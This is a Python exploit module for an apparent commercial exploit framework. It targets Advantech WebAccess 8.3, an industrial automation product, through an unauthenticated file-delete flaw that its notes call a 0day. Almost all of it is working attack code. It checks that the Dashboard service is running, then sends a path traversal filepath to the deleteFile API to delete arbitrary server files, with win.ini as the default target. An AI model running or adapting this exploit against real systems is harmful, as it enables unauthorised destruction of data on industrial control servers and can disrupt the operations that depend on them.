#!/usr/bin/env python

import ssl
import socket
import urllib2
ssl._create_default_https_context = ssl._create_unverified_context
from collections import OrderedDict
from Sploit import Sploit


INFO = {}
INFO['NAME'] = "efs_advantech_webaccess_8_3_file_delete"
INFO['DESCRIPTION'] = "Advantech WebAccess(8.3) Dashboard Viewer File Delete"
INFO['VENDOR'] = "http://www.advantech.ru/industrial-automation/webaccess"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    The specific flaw exists within the WebAccess Dashboard Viewer. Insufficient validation in the
/api/dashboard/v1/files/deleteFile api function allows unauthenticated attackers to delete arbitrary file on the server.
Tested against Advantech Webaccess 8.3 on Windows 7 x64 SP1. 
"""
INFO["DOWNLOAD_LINK"] = "http://www.advantech.ru/industrial-automation/webaccess"
INFO["LINKS"] = []
INFO['CHANGELOG'] = "16 Jan, 2018. Written by Gleg team."
INFO['PATH'] = "Web/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.103"
OPTIONS["PORT"] = 85, dict(description="Dashboard Service Port")
OPTIONS["FILENAME"] = '../../../../../../../windows/win.ini'
OPTIONS["VHOST"] = '/'
OPTIONS["SSL"] = False


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.ssl = self.args.get("SSL", OPTIONS["SSL"])
        self.filename = self.args.get("FILENAME", OPTIONS["FILENAME"])
        self.vhost = self.args.get("VHOST", OPTIONS["VHOST"])
        self.vhost = self.vhost.replace('\\', '/').strip('/')

    def make_url(self, path=''):
        proto = 'https' if self.ssl else 'http'
        url = '%s://%s:%s' % (proto, self.host, self.port)
        uri = '/'.join(s for s in [self.vhost, path] if s)
        url = url + '/' + uri if uri else url
        return url

    def run(self):
        #Get options from gui
        self.args()
        self.log('[*] Checking dashboard service')
        url = self.make_url('WADashboard/login?cont=dashboardViewer')
        res = urllib2.urlopen(url).read()
        if 'Dashboard Login' not in res:
            self.log('[-] Dashboard service disabled')
            self.finish(False)
        self.log('[*] Trying to delete file "%s"' % self.filename)
        data = urllib2.quote(self.filename)
        url = str(self.make_url('WADashboard/api/dashboard/v1/files/deleteFile?projectSpecies=&filepath=' + data))
        try:
            res = urllib2.urlopen(url, data="post=post").read()
        except socket.error as e:
            pass
        import time
        time.sleep(2)
        res = urllib2.urlopen(url, data="post=post").read()
        self.log(res)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
